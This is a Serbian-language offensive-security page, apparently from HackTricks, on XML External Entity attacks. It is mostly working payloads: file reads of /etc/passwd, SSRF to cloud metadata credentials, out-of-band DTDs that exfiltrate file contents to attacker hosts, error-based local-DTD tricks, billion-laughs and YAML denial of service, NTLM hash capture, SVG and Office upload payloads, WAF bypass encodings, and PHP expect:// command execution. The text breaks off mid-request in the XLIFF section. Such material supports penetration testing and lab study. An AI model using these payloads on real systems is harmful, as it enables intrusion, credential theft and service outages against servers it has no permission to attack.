# XXE - XEE - XML Eksterna Entitet

{{#include ../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnovi XML-a

XML je jezik za označavanje dizajniran za skladištenje i prenos podataka, sa fleksibilnom strukturom koja omogućava korišćenje opisno nazvanih oznaka. Razlikuje se od HTML-a po tome što nije ograničen na skup unapred definisanih oznaka. Značaj XML-a je opao sa porastom JSON-a, uprkos njegovoj početnoj ulozi u AJAX tehnologiji.

- **Predstavljanje podataka kroz entitete**: Entiteti u XML-u omogućavaju predstavljanje podataka, uključujući posebne karaktere kao što su `&lt;` i `&gt;`, koji odgovaraju `<` i `>` kako bi se izbegla sukob sa sistemom oznaka XML-a.
- **Definisanje XML elemenata**: XML omogućava definisanje tipova elemenata, naglašavajući kako bi elementi trebali biti strukturirani i koji sadržaj mogu sadržati, od bilo koje vrste sadržaja do specifičnih podelemenata.
- **Definicija tipa dokumenta (DTD)**: DTD-ovi su ključni u XML-u za definisanje strukture dokumenta i tipova podataka koje može sadržati. Mogu biti unutrašnji, spoljašnji ili kombinacija, usmeravajući kako se dokumenti formatiraju i validiraju.
- **Prilagođeni i spoljašnji entiteti**: XML podržava kreiranje prilagođenih entiteta unutar DTD-a za fleksibilno predstavljanje podataka. Spoljašnji entiteti, definisani URL-om, izazivaju bezbednosne brige, posebno u kontekstu napada XML Eksterna Entitet (XXE), koji koriste način na koji XML parseri obrađuju spoljne izvore podataka: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **XXE detekcija sa parametarskim entitetima**: Za detekciju XXE ranjivosti, posebno kada konvencionalne metode ne uspevaju zbog bezbednosnih mera parsera, mogu se koristiti XML parametarski entiteti. Ovi entiteti omogućavaju tehnike detekcije van opsega, kao što su pokretanje DNS upita ili HTTP zahteva ka kontrolisanoj domeni, kako bi se potvrdila ranjivost.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Glavni napadi

[**Većina ovih napada je testirana koristeći sjajne Portswigger XEE laboratorije: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Test nove entitete

U ovom napadu ću testirati da li jednostavna nova deklaracija ENTITETA funkcioniše.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../images/image (870).png>)

### Čitanje fajla

Pokušajmo da pročitajmo `/etc/passwd` na različite načine. Za Windows možete pokušati da pročitate: `C:\windows\system32\drivers\etc\hosts`

U ovom prvom slučaju primetite da će SYSTEM "_\*\*file:///\*\*etc/passwd_" takođe raditi.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../images/image (86).png>)

Ovaj drugi slučaj bi trebao biti koristan za ekstrakciju fajla ako web server koristi PHP (Nije slučaj sa Portswigger laboratorijama)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
U ovom trećem slučaju primetite da deklariramo `Element stockCheck` kao ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../images/image (753).png>)

### Listing direktorijuma

U **Java** aplikacijama može biti moguće **izlistati sadržaj direktorijuma** putem XXE sa payload-om kao što je (samo tražeći direktorijum umesto datoteke):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE se može koristiti za zloupotrebu SSRF unutar oblaka
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Koristeći **prethodno komentarisanu tehniku** možete naterati server da pristupi serveru koji kontrolišete kako biste pokazali da je ranjiv. Ali, ako to ne funkcioniše, možda je to zato što **XML entiteti nisu dozvoljeni**, u tom slučaju možete pokušati koristiti **XML parametarske entitete**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Ekstrakcija podataka van kanala

**U ovom slučaju ćemo naterati server da učita novu DTD sa zloćudnim payload-om koji će poslati sadržaj fajla putem HTTP zahteva (za višelinijske fajlove možete pokušati da ih ekstraktujete putem \_ftp://**\_ koristeći ovaj osnovni server na primer [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Ovo objašnjenje se zasniva na** [**Portswigger lab ovde**](https://portswigger.net/web-security/xxe/blind)**.**

U datoj zloćudnoj DTD, sprovodi se niz koraka za ekstrakciju podataka:

### Primer zloćudne DTD:

Struktura je sledeća:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Koraci koje izvršava ovaj DTD uključuju:

1. **Definicija Parametarskih Entiteta:**
- XML parametarski entitet, `%file`, se kreira, čitajući sadržaj datoteke `/etc/hostname`.
- Drugi XML parametarski entitet, `%eval`, se definiše. Dinamički deklarira novi XML parametarski entitet, `%exfiltrate`. Entitet `%exfiltrate` je postavljen da izvrši HTTP zahtev ka serveru napadača, prosleđujući sadržaj entiteta `%file` unutar upitnog stringa URL-a.
2. **Izvršenje Entiteta:**
- Entitet `%eval` se koristi, što dovodi do izvršenja dinamičke deklaracije entiteta `%exfiltrate`.
- Entitet `%exfiltrate` se zatim koristi, pokrećući HTTP zahtev ka specificiranom URL-u sa sadržajem datoteke.

Napadač hostuje ovaj zlonamerni DTD na serveru pod svojom kontrolom, obično na URL-u kao što je `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** Da bi iskoristio ranjivu aplikaciju, napadač šalje XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ovaj payload definiše XML parametarsku entitet `%xxe` i uključuje je unutar DTD-a. Kada je obrađen od strane XML parsera, ovaj payload preuzima eksterni DTD sa napadačeve servera. Parser zatim interpretira DTD inline, izvršavajući korake navedene u zlonamernom DTD-u i dovodeći do eksfiltracije datoteke `/etc/hostname` na napadačev server.

### Greška zasnovana (Eksterni DTD)

**U ovom slučaju ćemo naterati server da učita zlonamerni DTD koji će prikazati sadržaj datoteke unutar poruke o grešci (ovo važi samo ako možete videti poruke o grešci).** [**Primer odavde.**](https://portswigger.net/web-security/xxe/blind)

Poruku o grešci prilikom parsiranja XML-a, koja otkriva sadržaj datoteke `/etc/passwd`, moguće je izazvati korišćenjem zlonamernog spoljnog Definicije tipa dokumenta (DTD). To se postiže kroz sledeće korake:

1. Definisan je XML parametarski entitet pod imenom `file`, koji sadrži sadržaj datoteke `/etc/passwd`.
2. Definisan je XML parametarski entitet pod imenom `eval`, koji uključuje dinamičku deklaraciju za drugi XML parametarski entitet pod imenom `error`. Ovaj `error` entitet, kada se evaluira, pokušava da učita nepostojeću datoteku, uključujući sadržaj `file` entiteta kao svoje ime.
3. `eval` entitet se poziva, što dovodi do dinamičke deklaracije `error` entiteta.
4. Poziv `error` entiteta rezultira pokušajem učitavanja nepostojeće datoteke, proizvodeći poruku o grešci koja uključuje sadržaj datoteke `/etc/passwd` kao deo imena datoteke.

Zlonamerni eksterni DTD može se pozvati sa sledećim XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Upon execution, the web server's response should include an error message displaying the contents of the `/etc/passwd` file.

![](<../images/image (809).png>)

_**Molimo vas da primetite da eksterni DTD omogućava uključivanje jedne entiteta unutar druge (\*\***`eval`\***\*), ali to je zabranjeno u internom DTD. Stoga, ne možete izazvati grešku bez korišćenja eksternog DTD (obično).**_

### **Greška zasnovana (sistem DTD)**

Šta je sa slepim XXE ranjivostima kada su **izvan-bande interakcije blokirane** (eksterne konekcije nisu dostupne)?

Rupa u specifikaciji XML jezika može **izložiti osetljive podatke kroz poruke o grešci kada DTD dokumenta kombinuje interne i eksterne deklaracije**. Ovaj problem omogućava internu redefiniciju entiteta koji su deklarisani eksterno, olakšavajući izvršenje napada zasnovanih na grešci XXE. Takvi napadi koriste redefiniciju XML parametarskog entiteta, prvobitno deklarisanog u eksternom DTD, iz unutrašnjeg DTD. Kada server blokira izvan-bande konekcije, napadači moraju da se oslanjaju na lokalne DTD datoteke kako bi sproveli napad, sa ciljem da izazovu grešku u parsiranju kako bi otkrili osetljive informacije.

Razmotrite scenario u kojem datotečni sistem servera sadrži DTD datoteku na `/usr/local/app/schema.dtd`, koja definiše entitet nazvan `custom_entity`. Napadač može izazvati grešku u XML parsiranju otkrivajući sadržaj datoteke `/etc/passwd` podnošenjem hibridnog DTD-a na sledeći način:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Definisani koraci se izvršavaju ovim DTD-om:

- Definicija XML parametarskog entiteta nazvanog `local_dtd` uključuje spoljašnji DTD fajl smešten na datotečnom sistemu servera.
- Dolazi do redefinicije za `custom_entity` XML parametarski entitet, prvobitno definisan u spoljašnjem DTD-u, kako bi se obuhvatio [XXE exploit zasnovan na grešci](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ova redefinicija je dizajnirana da izazove grešku prilikom parsiranja, otkrivajući sadržaj fajla `/etc/passwd`.
- Korišćenjem `local_dtd` entiteta, aktivira se spoljašnji DTD, obuhvatajući novodefinisani `custom_entity`. Ova sekvenca radnji dovodi do emitovanja poruke o grešci koja je cilj exploita.

**Primer iz stvarnog sveta:** Sistemi koji koriste GNOME radno okruženje često imaju DTD na `/usr/share/yelp/dtd/docbookx.dtd` koji sadrži entitet nazvan `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../images/image (625).png>)

Pošto ova tehnika koristi **interni DTD, prvo morate pronaći važeći**. To možete učiniti **instaliranjem** istog **OS / Softvera** koji server koristi i **pretraživanjem nekih podrazumevanih DTD-ova**, ili **uzimanjem liste** **podrazumevanih DTD-ova** unutar sistema i **proverom** da li neki od njih postoji:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Za više informacija proverite [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Pronalaženje DTD-ova unutar sistema

U sledećem sjajnom github repozitorijumu možete pronaći **puteve DTD-ova koji mogu biti prisutni u sistemu**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Pored toga, ako imate **Docker sliku žrtvinskog sistema**, možete koristiti alat iz istog repozitorijuma da **skenirate** **sliku** i **pronađete** putanju **DTD-ova** prisutnih unutar sistema. Pročitajte [Readme repozitorijuma](https://github.com/GoSecure/dtd-finder) da biste saznali kako.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE putem Office Open XML parsera

Za detaljnije objašnjenje ovog napada, **pogledajte drugi deo** [**ovog neverovatnog posta**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **od Detectify**.

Mogućnost da se **otpremaju Microsoft Office dokumenti nudi mnoge web aplikacije**, koje zatim nastavljaju da izvode određene detalje iz ovih dokumenata. Na primer, web aplikacija može omogućiti korisnicima da uvezu podatke otpremanjem XLSX formata tabele. Da bi parser mogao da izvuče podatke iz tabele, neizbežno će morati da analizira barem jedan XML fajl.

Da bi se testirala ova ranjivost, potrebno je kreirati **Microsoft Office fajl koji sadrži XXE payload**. Prvi korak je da se kreira prazan direktorijum u koji se dokument može raspakovati.

Kada je dokument raspakovan, XML fajl smešten u `./unzipped/word/document.xml` treba otvoriti i urediti u omiljenom tekst editoru (kao što je vim). XML treba modifikovati da uključuje željeni XXE payload, često počinjući sa HTTP zahtevom.

Modifikovane XML linije treba umetnuti između dva korenska XML objekta. Važno je zameniti URL sa URL-om koji se može pratiti za zahteve.

Na kraju, fajl se može ponovo zipovati da bi se kreirao zlonamerni poc.docx fajl. Iz prethodno kreiranog "unzipped" direktorijuma, treba pokrenuti sledeću komandu:

Sada se kreirani fajl može otpremiti na potencijalno ranjivu web aplikaciju, i može se nadati da će zahtev pojaviti u Burp Collaborator logovima.

### Jar: protokol

**jar** protokol je dostupan isključivo unutar **Java aplikacija**. Dizajniran je da omogući pristup fajlovima unutar **PKZIP** arhive (npr., `.zip`, `.jar`, itd.), prilagođavajući se lokalnim i udaljenim fajlovima.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
> [!CAUTION]
> Da biste mogli da pristupite datotekama unutar PKZIP datoteka, to je **izuzetno korisno za zloupotrebu XXE putem sistemskih DTD datoteka.** Proverite [ovu sekciju da biste saznali kako da zloupotrebite sistemske DTD datoteke](xxe-xee-xml-external-entity.md#error-based-system-dtd).

Proces pristupanja datoteci unutar PKZIP arhive putem jar protokola uključuje nekoliko koraka:

1. HTTP zahtev se šalje za preuzimanje zip arhive sa određene lokacije, kao što je `https://download.website.com/archive.zip`.
2. HTTP odgovor koji sadrži arhivu se privremeno čuva na sistemu, obično na lokaciji kao što je `/tmp/...`.
3. Arhiva se zatim ekstrahuje da bi se pristupilo njenom sadržaju.
4. Konkretna datoteka unutar arhive, `file.zip`, se čita.
5. Nakon operacije, sve privremene datoteke kreirane tokom ovog procesa se brišu.

Zanimljiva tehnika za prekidanje ovog procesa u drugom koraku uključuje održavanje server konekcije otvorenom neodređeno dok se služi arhivska datoteka. Alati dostupni na [ovoj repozitoriji](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) mogu se koristiti u tu svrhu, uključujući Python server (`slow_http_server.py`) i Java server (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
> [!CAUTION]
> Pisanje fajlova u privremeni direktorijum može pomoći da se **eskalira druga ranjivost koja uključuje prelazak putanje** (kao što su lokalno uključivanje fajlova, injekcija šablona, XSLT RCE, deserializacija, itd).

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Attack
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml napad
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Kvadratni Blowup Napad

![](<../images/image (527).png>)

#### Dobijanje NTML

Na Windows hostovima moguće je dobiti NTML hash korisnika web servera postavljanjem responder.py handler-a:
```bash
Responder.py -I eth0 -v
```
i slanjem sledećeg zahteva
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Zatim možete pokušati da probijete hash koristeći hashcat

## Sakriveni XXE Površine

### XInclude

Kada se integrišu podaci klijenta u XML dokumente na serverskoj strani, poput onih u backend SOAP zahtevima, direktna kontrola nad XML strukturom je često ograničena, što otežava tradicionalne XXE napade zbog ograničenja u modifikaciji `DOCTYPE` elementa. Međutim, `XInclude` napad pruža rešenje omogućavajući umetanje spoljašnjih entiteta unutar bilo kog podatkovnog elementa XML dokumenta. Ova metoda je efikasna čak i kada se može kontrolisati samo deo podataka unutar XML dokumenta generisanog na serveru.

Da bi se izvršio `XInclude` napad, potrebno je deklarisati `XInclude` prostor imena, a putanja do datoteke za željeni spoljašnji entitet mora biti specificirana. Ispod je sažet primer kako se takav napad može formulisati:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za više informacija!

### SVG - Upload fajlova

Fajlovi koje korisnici otpremaju u određene aplikacije, a koji se zatim obrađuju na serveru, mogu iskoristiti ranjivosti u načinu na koji se obrađuju XML ili formati fajlova koji sadrže XML. Uobičajeni formati fajlova kao što su kancelarijski dokumenti (DOCX) i slike (SVG) zasnovani su na XML-u.

Kada korisnici **otpremaju slike**, te slike se obrađuju ili validiraju na strani servera. Čak i za aplikacije koje očekuju formate kao što su PNG ili JPEG, **biblioteka za obradu slika na serveru može takođe podržavati SVG slike**. SVG, kao format zasnovan na XML-u, može biti iskorišćen od strane napadača za slanje malicioznih SVG slika, čime se server izlaže XXE (XML External Entity) ranjivostima.

Primer takvog eksploata je prikazan ispod, gde maliciozna SVG slika pokušava da pročita sistemske fajlove:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Druga metoda uključuje pokušaj **izvršavanja komandi** putem PHP "expect" wrapper-a:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
U oba slučaja, SVG format se koristi za pokretanje napada koji iskorišćavaju XML procesne mogućnosti softvera servera, ističući potrebu za robusnom validacijom ulaza i bezbednosnim merama.

Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za više informacija!

**Napomena: prva linija pročitanog fajla ili rezultata izvršenja će se pojaviti UNUTAR kreirane slike. Dakle, morate biti u mogućnosti da pristupite slici koju je SVG kreirao.**

### **PDF - Učitavanje fajla**

Pročitajte sledeći post da **naučite kako da iskoristite XXE učitavanjem PDF** fajla:

{{#ref}}
file-upload/pdf-upload-xxe-and-cors-bypass.md
{{#endref}}

### Content-Type: Od x-www-urlencoded do XML

Ako POST zahtev prihvata podatke u XML formatu, mogli biste pokušati da iskoristite XXE u tom zahtevu. Na primer, ako normalan zahtev sadrži sledeće:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Tada možete poslati sledeći zahtev, sa istim rezultatom:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Od JSON-a do XEE

Da biste promenili zahtev, možete koristiti Burp ekstenziju pod nazivom “**Content Type Converter**“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) možete pronaći ovaj primer:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Još jedan primer se može naći [ovde](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Obilaženje zaštita

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Ovo funkcioniše samo ako XML server prihvata `data://` protokol.

### UTF-7

Možete koristiti \[**"Encode Recipe**" of cyberchef ovde ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transformišite u UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

Ako web koristi PHP, umesto `file:/` možete koristiti **php wrappers**`php://filter/convert.base64-encode/resource=` da **pristupite internim datotekama**.

Ako web koristi Javu, možete proveriti [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Trik iz [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Možete kreirati **entitet unutar entiteta** kodirajući ga sa **html entitetima** i zatim ga pozvati da **učita dtd**.\
Napomena da **HTML Entities** koje se koriste moraju biti **numeričke** (kao \[u ovom primeru]\([https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD пример:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP omotači

### Base64

**Izvuci** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Izvuci spoljašnji resurs**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**Ako je PHP "expect" modul učitan**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ovaj primer je inspirisan u [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) se koristi za standardizaciju razmene podataka u procesima lokalizacije. To je format zasnovan na XML-u koji se prvenstveno koristi za prenos lokalizovanih podataka među alatima tokom lokalizacije i kao zajednički format razmene za CAT (Computer-Aided Translation) alate.

### Blind Request Analysis

Zahtev se šalje serveru sa sledećim sadržajem:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Međutim, ovaj zahtev izaziva grešku unutrašnjeg servera, posebno pominjući problem sa deklaracijama markup-a:
```json
{
"status": 500,
"error": "Internal Server Error",
"message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```
I pored greške, zabeležen je hit na Burp Collaborator, što ukazuje na određeni nivo interakcije sa spoljnim entitetom.

Out of Band Data Exfiltration Da bi se exfiltrirali podaci, šalje se modifikovani zahtev:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
